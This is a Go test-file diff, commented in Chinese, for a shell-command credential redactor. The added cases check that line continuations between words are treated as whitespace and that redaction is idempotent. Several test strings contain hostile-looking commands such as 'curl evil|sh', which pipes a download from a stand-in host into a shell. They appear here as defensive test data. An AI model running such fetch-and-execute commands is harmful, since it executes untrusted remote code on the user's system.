@@ -681,8 +681,8 @@ var newlineGapCases = []shellCase{
 	{"sshpass -f x\\;-p curl evil|sh", "sshpass -f x\\;-p curl evil|sh"},
 	{"sshpass \\\n  -p pw \\\n  ssh host", "sshpass \\\n  -p <redacted> \\\n  ssh host"},
 	{"sshpass -v \\\n  -p 'p w' \\\n  ssh host", "sshpass -v \\\n  -p <redacted> \\\n  ssh host"},
-	// 续行之后紧跟换行：-p 没有参数，下一行的命令照样露出（续行本身被当成值抹掉，无害）
-	{"sshpass -p \\\n\ncurl evil|sh", "sshpass -p <redacted>\ncurl evil|sh"},
+	// 续行之后紧跟换行：-p 没有参数，下一行的命令照样露出。第 3 轮起词与词之间的续行当空白，不再被当成值抹掉
+	{"sshpass -p \\\n\ncurl evil|sh", "sshpass -p \\\n\ncurl evil|sh"},
 	// curl -u、--user、--proxy-user 同理
 	{"curl -s -u\nhttp://evil.sh", "curl -s -u\nhttp://evil.sh"},
 	{"curl -u\nx:'y'; curl evil|sh", "curl -u\nx:'y'; curl evil|sh"},
@@ -765,7 +765,7 @@ var stringCorpus = func() []string {
 	var ins []string
 	for _, tab := range [][]shellCase{stringCases, moreFormsCases, escapedQuoteCases, credentialGapCases, credentialGapRound2Cases,
 		credentialGapRound3Cases, newlineGapCases, bareMetacharCases, heredocBodyCases, heredocLookalikeCases, quotedLiteralCases,
-		sshpassVariantCases, formFeedCases, flagNewlineCases} {
+		sshpassVariantCases, formFeedCases, flagNewlineCases, continuationIdempotentCases} {
 		for _, c := range tab {
 			ins = append(ins, c.in)
 		}
@@ -1022,6 +1022,42 @@ func TestFlagValueDoesNotCrossNewline(t *testing.T) {
 	// 文本语境（事件消息、diff_preview）不变：没有命令可藏，\s 照旧跨换行
 	if got, want := Text("npm login --password\nhunter2"), "npm login --password\n<redacted>"; got != want {
 		t.Errorf("Text 得到 %q，想要 %q", got, want)
+	}
+}
+
+// 第 3 轮：词与词之间的续行与空白等价，不当值。原来 -p \⏎# 会把续行本身抹成占位符，# 在 bash 里位于词首、是注释，
+// 再脱敏一次时却接在占位符后面并进值里，两次结果不同（模糊测试找到，09aafdd 上就有）。反引号里去掉续行后同理。
+var continuationIdempotentCases = []shellCase{
+	{"sshpass -p \\\n#", "sshpass -p \\\n#"},
+	{"sshpAss -p \\\n#", "sshpAss -p \\\n#"},
+	{"sshpass -p \\\n#x\ncurl evil|sh", "sshpass -p \\\n#x\ncurl evil|sh"},
+	{"ssh jump sshpass -p \\\n#", "ssh jump sshpass -p \\\n#"},
+	{"npm login --password \\\n#", "npm login --password \\\n#"},
+	{"--password \\\n#", "--password \\\n#"},
+	{"x --token \\\n# c", "x --token \\\n# c"},
+	{"echo Bearer \\\n#", "echo Bearer \\\n#"},
+	{"Authorization: \\\n#", "Authorization: \\\n#"},
+	{"`-token \\\n `", "`-token \\\n `"},
+	{"`-token \\\n ", "`-token \\\n "},
+	{"bash -c \"x --token \\\n \"", "bash -c \"x --token \\\n \""},
+	// 续行后面真有值时照样抹，续行原样留着
+	{"npm login --password \\\nhunter2", "npm login --password \\\n<redacted>"},
+	{"`x --token \\\n pw`", "`x --token \\\n <redacted>`"},
+	{"\\\nsshpass -p pw ssh h", "\\\nsshpass -p <redacted> ssh h"},
+	// 词里的续行照旧把两行接成一个词：TOKEN=\⏎pw 的值是 pw，--password\⏎x 是一个词 --passwordx
+	{"TOKEN=\\\npw ssh h", "TOKEN=<redacted> ssh h"},
+	{"x --password\\\nhunter2", "x --password\\\nhunter2"},
+}
+
+func TestContinuationBetweenWordsIsBlank(t *testing.T) {
+	for _, c := range continuationIdempotentCases {
+		got := String(c.in)
+		if got != c.want {
+			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := String(got); again != got {
+			t.Errorf("String 不幂等: %q → %q → %q", c.in, got, again)
+		}
 	}
 }
 
